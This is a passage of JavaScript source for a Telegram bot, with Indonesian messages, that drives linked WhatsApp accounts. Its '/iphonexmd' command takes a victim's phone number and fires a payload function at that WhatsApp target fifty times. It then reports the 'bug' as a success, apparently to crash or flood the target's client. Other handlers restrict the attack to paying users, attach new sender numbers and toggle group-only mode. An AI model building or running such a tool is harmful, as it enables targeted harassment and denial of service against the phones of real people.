        reply_markup: {
            inline_keyboard: [[
                { text: "📱Click To View Target", url: `https://wa.me/${xmd}` }
            ]]
        }
    });
});

bot.onText(/\/iphonexmd(.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    const fromName = msg.from.first_name || 'User';
    const xmd = match[1];
    
     if (grouponlyEnabled && msg.chat.type === "private") {
    bot.sendMessage(
      config.LOG_GROUP_ID,
      `\`\`\`⚠️-WARNING-ADA-YANG-PV-BOT‼️\nUSERNAME: @${msg.from.username || msg.from.first_name}\nID: ${msg.from.id}\nCMD: /iphonexmd\`\`\``,
      { parse_mode: "Markdown" }
    ).catch(() => {});
    return;
  }
    
     if (!isPremiumUser(fromId) && !config.OWNER_ID.includes(fromId)) {
    return bot.sendMessage(chatId, "❌ Lu bukan premium / owner banh 🗿");
    }

    if (!xmd) return bot.sendMessage(chatId, `salah kocak yg bener gini /iphonexmd 628xxx`);

    const target = xmd.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    
    const processMessage = await bot.sendPhoto(chatId, thumbnailUrl, {
        caption: `\`\`\`X\bM\bD\bI\bN\bV\bA\bS\bI\bO\bN
─ Ollaa, ${fromName} Status bug nya di bawah yaaa, mohon gunakan dengan baik. salam @kyzzexX
#- Information Bugs
≈ Target: ${xmd}
≈ Status: Succes
≈ Type: iphonexmd
Click the button below to find out your target.\`\`\`
\`\`\`- Credits by @kyzzexX
\`\`\``,
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [[
                { text: "📱 Click To View Target", url: `https://wa.me/${xmd}` }
            ]]
        }
    });

    const processMessageId = processMessage.message_id;

    for (let i = 0; i < 50; i++) {
        await namafunc(sock, target); 
        await sleep(1000);
    }

    await bot.editMessageCaption(`\`\`\`X\bM\bD\bI\bN\bV\bA\bS\bI\bO\bN
─ Ollaa, ${fromName} Status bug nya di bawah yaaa, mohon gunakan dengan baik. salam @kyzzexX
#- Information Bugs
≈ Target: ${xmd}
≈ Status: Succes
≈ Type: iphonexmd
Click the button below to find out your target.\`\`\`
\`\`\`- Credits by @kyzzexX
\`\`\``, {
        chat_id: chatId,
        message_id: processMessageId,
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [[
                { text: "📱Click To View Target", url: `https://wa.me/${xmd}` }
            ]]
        }
    });
});

bot.onText(/\/addsender (.+)/, async (msg, match) => {
const fromId = msg.from.id;
const chatId = msg.chat.id;

 if (grouponlyEnabled && msg.chat.type === "private") {
    bot.sendMessage(
      config.LOG_GROUP_ID,
      `\`\`\`⚠️-WARNING-ADA-YANG-PV-BOT‼️\nUSERNAME: @${msg.from.username || msg.from.first_name}\nID: ${msg.from.id}\nCMD: /addsender\`\`\``,
      { parse_mode: "Markdown" }
    ).catch(() => {});
    return;
  }

  if (!match || !match[1]) {
    return bot.sendMessage(chatId, "Salah kocag gini yg bener  /sender <nomor>");
  }

   if (!config.OWNER_ID.includes(fromId)) {
        return bot.sendMessage(chatId, "❌ Khusus Owner Jir🗿");
    }

  const botNumber = match[1].replace(/[^0-9]/g, "");
  if (!botNumber) {
    return bot.sendMessage(chatId, "Nomor tidak valid.");
  }

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(chatId, "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi.");
  }
});

bot.onText(/\/gbonly (on|off)/i, (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;
  
   if (grouponlyEnabled && msg.chat.type === "private") {
    bot.sendMessage(
      config.LOG_GROUP_ID,
      `\`\`\`⚠️-WARNING-ADA-YANG-PV-BOT‼️\nUSERNAME: @${msg.from.username || msg.from.first_name}\nID: ${msg.from.id}\nCMD: /gbonly\`\`\``,
      { parse_mode: "Markdown" }
    ).catch(() => {});
    return;
  }
  
  if (!config.OWNER_ID.includes(fromId)) {
        return bot.sendMessage(chatId, "❌ Khusus Owner Jir🗿");
    }
    
  const arg = match[1].toLowerCase();
  if (arg === "on") {
    grouponlyEnabled = true;
  } else if (arg === "off") {
    grouponlyEnabled = false;
  } else {
    return bot.sendMessage(msg.chat.id, "❌ Salah bego yg bnerr gini /gbonly on/off");
  }
  saveSettings({ grouponlyEnabled });
  bot.sendMessage(msg.chat.id, `✅ gb only sekarang: ${grouponlyEnabled ? "on" : "off"}`);
});